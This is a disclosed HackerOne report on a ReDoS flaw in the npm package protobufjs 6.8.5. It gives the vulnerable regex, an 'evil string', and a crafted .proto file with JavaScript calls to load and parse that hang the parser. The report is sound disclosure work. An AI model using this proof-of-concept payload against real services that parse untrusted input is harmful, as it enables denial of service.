# `protobufjs` is vulnerable to ReDoS when parsing crafted invalid *.proto files

## Report Details
- **Report ID**: 319576
- **URL**: https://hackerone.com/reports/319576
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-02-25T17:59:38.999Z
- **Disclosed**: 2018-03-31T20:38:42.297Z

## Reporter
- **Username**: chalker
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a ReDoS in `protobufjs`
It allows to cause Denial of Service by trying to parse (or load) a crafted `*.proto` file.

# Module

**module name:** protobufjs
**version:** 6.8.5
**npm page:** `https://www.npmjs.com/package/[MODULE NAME]`

## Module Description

> Protocol Buffers are a language-neutral, platform-neutral, extensible way of serializing structured data for use in communications protocols, data storage, and more, originally designed at Google (see).

## Module Stats

-22 592 downloads in the last day
352 974 downloads in the last week
1 321 151 downloads in the last month

~15 853 812 estimated downloads per year

# Vulnerability

## Vulnerability Description

ReDoS.
- regex: `/^(?:\.?[a-zA-Z_][a-zA-Z_0-9]*)+$/`
- evil string: `xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx!`
- file: https://github.com/dcodeIO/protobuf.js/blob/6.8.5/src/parse.js#L27 

## Steps To Reproduce:

proto file:

```
// awesome.proto
package awesomepackage;
syntax = "proto3";

message AwesomeMessage {
    option (my_option) = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx!;
}
```

js file:

```js
require('protobufjs').load("./awesome.proto", () => {});
```

or, just with `parse`:

```js
require('protobufjs').parse(`
package awesomepackage;
syntax = "proto3";

message AwesomeMessage {
    option (my_option) = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx!;
}
`, () => {});
```

## Supporting Material/References:

- Arch Linux Current
- Node.js 9.5.0
- npm 5.6.0

# Wrap up

- I contacted the maintainer to let him know: N
- I opened an issue in the related repository: N

## Impact

Cause denial of service by parsing a crafted *.proto file.

## Attachments
No attachments
